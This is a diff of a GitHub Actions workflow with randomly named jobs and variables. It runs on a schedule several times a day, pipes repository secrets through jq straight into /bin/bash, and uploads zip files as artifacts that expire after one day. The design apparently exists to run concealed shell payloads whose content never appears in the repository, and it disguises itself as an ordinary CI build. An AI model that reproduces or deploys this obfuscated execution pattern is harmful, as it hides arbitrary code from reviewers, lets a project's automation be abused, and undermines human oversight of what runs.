@@ -1,32 +1,25 @@
 name: asyncactions64
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '27 0/6 * * *'
+    - cron: '55 4,10,16,22 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: asyncactions64
         env:
-          ixm19: ${{ secrets.ixm19 }}
+          vcy11: ${{ secrets.vcy11 }}
         run: |
-          echo $ixm19 | jq -r .ete25808 | /bin/bash
-          echo $i097 | jq -r .clix1 | /bin/bash
-          echo $snjri23079 | jq -r .mtxd04 | /bin/bash
-          echo $qanen260 | jq -r .agjls56123 | /bin/bash
-          echo $lxxm2 | jq -r .jxz41254 | /bin/bash
-          echo $ygc50 | jq -r .vbdvj33 | /bin/bash
-          echo $jr6 | jq -r .bnba06 | /bin/bash
-          echo $weki0 | jq -r .r9 | /bin/bash
-          echo $bj8976 | jq -r .ns524 | /bin/bash
-          echo $uf2 | jq -r .x7 | /bin/bash
-          echo $jq781 | jq -r .spdu66 | /bin/bash
-          echo $t49 | jq -r .r9317 | /bin/bash
-          echo $m1 | jq -r .bccm869 | /bin/bash
-          echo $sxpqk39080 | jq -r .ai83638 | /bin/bash
-          echo $qp34411 | jq -r .hbly60372 | /bin/bash
+          printf '%s' "$vcy11" | jq -r .c211 | /bin/bash
+          echo $p9 | jq -r .t187 | /bin/bash
+          echo $z795 | jq -r .ybm9 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: lxrAYyKW
+          path: "*.zip"
+          retention-days: 1
